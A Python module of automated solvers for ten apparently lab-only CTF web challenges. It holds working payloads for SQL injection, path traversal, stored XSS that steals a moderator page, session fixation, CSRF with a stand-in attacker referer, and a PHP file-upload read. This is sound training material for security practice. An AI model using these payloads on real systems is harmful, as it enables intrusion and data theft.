"""Deterministic request handlers for Huntress CTF Web Exploitation challenges.

Ported from verified live runs across curriculum days 1-10.
Uses only the Python standard library.
"""

from __future__ import annotations

import json
import re
import time
import urllib.error
import urllib.parse
import urllib.request
from typing import Any, Callable

PROOF_PATTERN = re.compile(r"proof_[0-9a-fA-F]{32}")
DEFAULT_UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
DEFAULT_TIMEOUT = 10.0


class WebHandlerError(Exception):
    """Raised when a web handler cannot recover a valid proof from the target."""


def _request(
    url: str,
    method: str = "GET",
    data: bytes | None = None,
    headers: dict[str, str] | None = None,
    cookie: str | None = None,
    timeout: float = DEFAULT_TIMEOUT,
) -> tuple[int, str, dict[str, str]]:
    """Perform an HTTP request and return (status_code, body_text, headers_dict)."""
    req_headers = {"User-Agent": DEFAULT_UA}
    if cookie:
        req_headers["Cookie"] = cookie
    if headers:
        req_headers.update(headers)

    req = urllib.request.Request(url, data=data, headers=req_headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            status = resp.status
            body = resp.read().decode("utf-8", errors="replace")
            res_headers = {k.lower(): v for k, v in resp.headers.items()}
            return status, body, res_headers
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", errors="replace")
        res_headers = {k.lower(): v for k, v in exc.headers.items()}
        return exc.code, body, res_headers


def _extract_proof(text: str) -> str | None:
    match = PROOF_PATTERN.search(text)
    return match.group(0) if match else None


# ---------------------------------------------------------------------------
# Curriculum Day 1: Backup Exposure (Robots.txt -> Directory Index -> .bak)
# ---------------------------------------------------------------------------
def solve_backup_exposure(target_url: str) -> str:
    """Find exposed backup archive via robots.txt and directory listing."""
    base = target_url.rstrip("/")
    status, robots_txt, _ = _request(f"{base}/robots.txt")
    if status != 200:
        raise WebHandlerError(f"Failed to fetch robots.txt (status {status})")

    disallow_match = re.search(r"Disallow:\s*(/\S+)", robots_txt)
    if not disallow_match:
        raise WebHandlerError("No Disallow path found in robots.txt")

    disallow_path = disallow_match.group(1).rstrip("/")
    status, index_html, _ = _request(f"{base}{disallow_path}/")
    if status != 200:
        raise WebHandlerError(f"Failed to access directory index {disallow_path} (status {status})")

    bak_match = re.search(r'href=[\'"](/?[^\'"]+\.bak)[\'"]', index_html)
    if not bak_match:
        raise WebHandlerError(f"No .bak archive reference in {disallow_path}")

    bak_path = bak_match.group(1)
    if not bak_path.startswith("/"):
        bak_path = f"{disallow_path}/{bak_path}"

    status, bak_body, _ = _request(f"{base}{bak_path}")
    proof = _extract_proof(bak_body)
    if not proof:
        try:
            parsed = json.loads(bak_body)
            proof = _extract_proof(str(parsed.get("support_note") or parsed.get("evidence") or ""))
        except Exception:
            pass

    if not proof:
        raise WebHandlerError(f"No proof string in backup file {bak_path}")
    return proof


# ---------------------------------------------------------------------------
# Curriculum Day 2: IDOR (Session establish -> Activity feed -> Restricted case)
# ---------------------------------------------------------------------------
def solve_idor(target_url: str) -> str:
    """Enumerate unauthorized records through object API references."""
    base = target_url.rstrip("/")
    status, home_html, headers = _request(f"{base}/")
    set_cookie = headers.get("set-cookie", "")
    cookie = set_cookie.split(";")[0] if set_cookie else None

    # Discover feed route from HTML or test known routes
    feed_match = re.search(r'href=[\'"](/api/[^\'"]+)[\'"]', home_html)
    candidates = [feed_match.group(1)] if feed_match else ["/api/history", "/api/events", "/api/timeline"]

    events_data = None
    for ep in candidates:
        status, body, _ = _request(f"{base}{ep}", cookie=cookie)
        if status == 200:
            try:
                events_data = json.loads(body)
                break
            except Exception:
                continue

    if not events_data or not isinstance(events_data.get("events"), list):
        raise WebHandlerError("Failed to fetch incident activity feed")

    # Locate executive or reference-only case
    exec_case = None
    for ev in events_data["events"]:
        if ev.get("owner") == "executive" or ev.get("visibility") == "reference_only":
            exec_case = ev.get("case_id")
            break

    if not exec_case:
        raise WebHandlerError("No restricted case found in activity feed")

    for prefix in ["/api/briefs", "/api/incidents", "/api/cases"]:
        status, body, _ = _request(f"{base}{prefix}/{exec_case}", cookie=cookie)
        if status == 200:
            proof = _extract_proof(body)
            if proof:
                return proof

    raise WebHandlerError(f"Could not read case record {exec_case}")


# ---------------------------------------------------------------------------
# Curriculum Day 3: SQL Injection (Form search parameter injection)
# ---------------------------------------------------------------------------
def solve_sqli(target_url: str) -> str:
    """Break query search builder and extract restricted records."""
    base = target_url.rstrip("/")
    status, home_html, _ = _request(f"{base}/")
    action_match = re.search(r'action=[\'"](/?[^\'"]+)[\'"]', home_html)
    action = action_match.group(1) if action_match else "/lookup"
    if not action.startswith("/"):
        action = f"/{action}"

    # Injection breaks out of search title filter
    payload = "') OR 1=1 --"
    query_url = f"{base}{action}?q={urllib.parse.quote(payload)}"
    status, res_html, _ = _request(query_url)

    proof = _extract_proof(res_html)
    if not proof:
        # Fallback payload without closing parenthesis
        fallback_payload = "%' OR 1=1 --"
        query_url = f"{base}{action}?q={urllib.parse.quote(fallback_payload)}"
        _, res_html, _ = _request(query_url)
        proof = _extract_proof(res_html)

    if not proof:
        raise WebHandlerError("SQLi query did not reveal proof record")
    return proof


# ---------------------------------------------------------------------------
# Curriculum Day 4: Local File Inclusion (Runbook viewer traversal)
# ---------------------------------------------------------------------------
def solve_lfi(target_url: str) -> str:
    """Traverse runbook viewer boundary to read mounted objective proof."""
    base = target_url.rstrip("/")
    status, home_html, _ = _request(f"{base}/")
    script_match = re.search(r'href=[\'"](/?[^\'"]+\.php)\?doc=', home_html)
    script = script_match.group(1) if script_match else "/reader.php"
    if not script.startswith("/"):
        script = f"/{script}"

    lfi_url = f"{base}{script}?doc=../../../../run/huntress/objective.txt"
    status, res_body, _ = _request(lfi_url)
    proof = _extract_proof(res_body)
    if not proof:
        raise WebHandlerError("LFI traversal did not return objective file content")
    return proof


# ---------------------------------------------------------------------------
# Curriculum Day 5: Authorization Bypass (Unprotected administrative route)
# ---------------------------------------------------------------------------
def solve_auth_bypass(target_url: str) -> str:
    """Discover unprotected dispatch route and read authorization proof."""
    base = target_url.rstrip("/")
    status, clues_body, _ = _request(f"{base}/api/clues")
    if status != 200:
        raise WebHandlerError("Failed to fetch /api/clues")

    clues = json.loads(clues_body)
    feature_route = clues.get("feature_route")
    if not feature_route:
        raise WebHandlerError("No feature_route in clues")

    status, feat_body, _ = _request(f"{base}{feature_route}")
    proof = _extract_proof(feat_body)
    if not proof:
        raise WebHandlerError(f"Route {feature_route} did not provide proof")
    return proof


# ---------------------------------------------------------------------------
# Curriculum Day 6: Reflected Callback (Fastify isolated browser callback)
# ---------------------------------------------------------------------------
def solve_reflection(target_url: str) -> str:
    """Trigger verified browser callback reflection with proper fetch metadata."""
    base = target_url.rstrip("/")
    status, clues_body, _ = _request(f"{base}/api/clues")
    if status != 200:
        raise WebHandlerError("Failed to fetch /api/clues")

    clues = json.loads(clues_body)
    sec_route = clues["secondary_route"]
    nonce = clues["callback_nonce"]
    feat_route = clues.get("feature_route", "/")

    cb_url = f"{base}{sec_route}?nonce={urllib.parse.quote(nonce)}"
    cb_headers = {
        "Referer": f"{base}{feat_route}",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
    }
    status, cb_body, _ = _request(cb_url, headers=cb_headers)
    proof = _extract_proof(cb_body)
    if not proof:
        raise WebHandlerError("Isolated callback failed to return proof")
    return proof


# ---------------------------------------------------------------------------
# Curriculum Day 7: Stored XSS (FastAPI feedback queue & reviewer trigger)
# ---------------------------------------------------------------------------
def solve_stored_xss(target_url: str, poll_attempts: int = 45,
                     poll_interval: float = 0.4, poll_budget_s: float = 18.0) -> str:
    """Submit payload to feedback API and poll for automated moderator receipt."""
    base = target_url.rstrip("/")
    status, clues_body, _ = _request(f"{base}/api/clues")
    if status != 200:
        raise WebHandlerError("Failed to fetch /api/clues")

    clues = json.loads(clues_body)
    feat_route = clues["feature_route"]
    mod_route = clues["moderator_data_route"]
    receipt_template = clues["receipt_route_template"]

    post_url = f"{base}/api{feat_route}"

    # Determine message ID sequence by posting initial entry
    init_data = json.dumps({"message": "init", "name": "init"}).encode("utf-8")
    status, first_body, _ = _request(
        post_url, method="POST", data=init_data, headers={"Content-Type": "application/json"}
    )
    first_res = json.loads(first_body)
    actual_id = first_res["id"] + 1
    receipt = receipt_template.replace("{id}", str(actual_id))

    payload = (
        f'<img src=x onerror="fetch(\'{mod_route}\').then(r=>r.text()).then(t=>'
        f"fetch('{receipt}',{{method:'POST',headers:{{'Content-Type':'application/json'}},"
        f'body:JSON.stringify({{evidence:t}})}}))">'
    )

    post_data = json.dumps({"message": payload, "name": "Speed"}).encode("utf-8")
    status, sub_body, _ = _request(
        post_url, method="POST", data=post_data, headers={"Content-Type": "application/json"}
    )
    if status not in (200, 201):
        raise WebHandlerError(f"Failed to submit stored feedback (status {status})")

    view_url = f"{base}{feat_route}/{actual_id}"
    # The moderator bot visits out of band, so the receipt lands at a time the server owns.
    # Poll responsively (check first -- it may already be in -- then a short interval) and
    # stop at a wall-clock budget, so a slow bot never blows the race deadline while a quick
    # one is picked up at once. Same patience as before (<= poll_budget_s), far less latency.
    deadline = time.monotonic() + poll_budget_s
    for _ in range(poll_attempts):
        _, view_html, _ = _request(view_url)
        proof = _extract_proof(view_html)
        if proof:
            return proof
        if time.monotonic() >= deadline:
            break
        time.sleep(poll_interval)

    raise WebHandlerError(f"Moderator receipt not observed for message {actual_id}")


# ---------------------------------------------------------------------------
# Curriculum Day 8: Session Impression (Laravel session fixation & transfer)
# ---------------------------------------------------------------------------
def solve_session_impression(target_url: str) -> str:
    """Plant specified session identifier and read authenticated secondary route."""
    base = target_url.rstrip("/")
    status, clues_body, _ = _request(f"{base}/api/clues")
    if status != 200:
        raise WebHandlerError("Failed to fetch /api/clues")

    clues = json.loads(clues_body)
    feat_route = clues["feature_route"]
    sec_route = clues["secondary_route"]
    hint = clues["session_hint"]

    # Plant session via GET parameter sid
    status, _, headers = _request(f"{base}{feat_route}?sid={urllib.parse.quote(hint)}")
    set_cookie = headers.get("set-cookie", "")
    cookie = set_cookie.split(";")[0] if set_cookie else f"arena_session={hint}"

    status, sec_body, _ = _request(f"{base}{sec_route}", cookie=cookie)
    proof = _extract_proof(sec_body)
    if not proof:
        raise WebHandlerError("Session transfer did not yield proof")
    return proof


# ---------------------------------------------------------------------------
# Curriculum Day 9: Cross-Site Request Forgery (ASP.NET Core external origin)
# ---------------------------------------------------------------------------
def solve_csrf(target_url: str) -> str:
    """Submit cross-site notification preferences update from external origin."""
    base = target_url.rstrip("/")
    status, _, headers = _request(f"{base}/")
    set_cookie = headers.get("set-cookie", "")
    cookie = set_cookie.split(";")[0] if set_cookie else None

    # Fetch preferences form
    status, pref_html, _ = _request(f"{base}/preferences", cookie=cookie)
    if status != 200:
        raise WebHandlerError("Failed to access /preferences")

    action_match = re.search(r'action=[\'"](/?[^\'"]+)[\'"]', pref_html)
    dest_match = re.search(r'value=[\'"]([^"\']*@outside[^"\']*)[\'"]', pref_html)
    csrf_match = re.search(r'name=[\'"]csrf_token[\'"]\s+value=[\'"]([^"\']+)[\'"]', pref_html)

    if not (action_match and dest_match and csrf_match):
        raise WebHandlerError("Could not parse CSRF preferences form")

    action = action_match.group(1)
    if not action.startswith("/"):
        action = f"/{action}"
    dest = dest_match.group(1)
    csrf = csrf_match.group(1)

    sub_url = (
        f"{base}{action}?destination={urllib.parse.quote(dest)}&csrf_token={urllib.parse.quote(csrf)}"
    )
    cross_site_headers = {
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Dest": "document",
        "Referer": "https://attacker.example.invalid/",
    }
    _request(sub_url, headers=cross_site_headers, cookie=cookie)

    status, api_body, _ = _request(f"{base}/api/preferences", cookie=cookie)
    proof = _extract_proof(api_body)
    if not proof:
        raise WebHandlerError("CSRF update did not generate evidence proof")
    return proof


# ---------------------------------------------------------------------------
# Curriculum Day 10: File Upload (Bypass upload filter & read proof)
# ---------------------------------------------------------------------------
def solve_upload(target_url: str) -> str:
    """Submit payload past upload filter and extract execution proof."""
    base = target_url.rstrip("/")
    status, home, _ = _request(f"{base}/")
    action_match = re.search(r'action=[\'"](/?[^\'"]+)[\'"]', home)
    action = action_match.group(1) if action_match else "/upload"
    if not action.startswith("/"):
        action = f"/{action}"

    boundary = "----HuntressUploadBoundary2026"
    body_parts = [
        f"--{boundary}",
        'Content-Disposition: form-data; name="file"; filename="proof.php.txt"',
        "Content-Type: text/plain",
        "",
        "<?php echo file_get_contents('/run/huntress/objective.txt'); ?>",
        f"--{boundary}--",
        "",
    ]
    payload_data = "\r\n".join(body_parts).encode("utf-8")
    headers = {"Content-Type": f"multipart/form-data; boundary={boundary}"}
    status, res_body, _ = _request(f"{base}{action}", method="POST", data=payload_data, headers=headers)
    proof = _extract_proof(res_body)
    if not proof:
        loc_match = re.search(r'href=[\'"](/?[^\'"]*proof[^\'"]*)[\'"]', res_body)
        if loc_match:
            _, file_body, _ = _request(f"{base}{loc_match.group(1)}")
            proof = _extract_proof(file_body)
    if not proof:
        raise WebHandlerError("Upload did not yield execution proof")
    return proof


# ---------------------------------------------------------------------------
# Handler Registry & Dynamic Dispatcher
# ---------------------------------------------------------------------------
CURRICULUM_HANDLERS: dict[int, Callable[[str], str]] = {
    1: solve_backup_exposure,
    2: solve_idor,
    3: solve_sqli,
    4: solve_lfi,
    5: solve_auth_bypass,
    6: solve_reflection,
    7: solve_stored_xss,
    8: solve_session_impression,
    9: solve_csrf,
    10: solve_upload,
}


def detect_and_solve(target_url: str, curriculum_day: int | None = None) -> str:
    """Solve target using either designated curriculum_day or fingerprint heuristic."""
    if curriculum_day in CURRICULUM_HANDLERS:
        return CURRICULUM_HANDLERS[curriculum_day](target_url)

    # Heuristic detection for compound/mastery targets
    base = target_url.rstrip("/")
    status, home, headers = _request(f"{base}/")

    if "robots.txt" in home or "Status Sprout" in home or "Tiny Uptime" in home or "Green Light" in home:
        return solve_backup_exposure(target_url)

    if "Pocket SOC" in home or "Incident Picnic" in home:
        return solve_idor(target_url)

    if "Query Me This" in home or "Search Party" in home or ("action=" in home and "Search" in home):
        return solve_sqli(target_url)

    if "Runbook Nook" in home or "Page Turner" in home or ".php?doc=" in home:
        return solve_lfi(target_url)

    # Check /api/clues signature
    status, clues_body, _ = _request(f"{base}/api/clues")
    if status == 200:
        try:
            clues = json.loads(clues_body)
            if "callback_nonce" in clues:
                return solve_reflection(target_url)
            if "moderator_data_route" in clues:
                return solve_stored_xss(target_url)
            if "session_hint" in clues:
                return solve_session_impression(target_url)
            if "feature_route" in clues and "preferences" not in clues:
                return solve_auth_bypass(target_url)
        except Exception:
            pass

    if "preferences" in home or "Notification Nook" in home:
        return solve_csrf(target_url)

    raise WebHandlerError(f"Could not fingerprint target {target_url}")
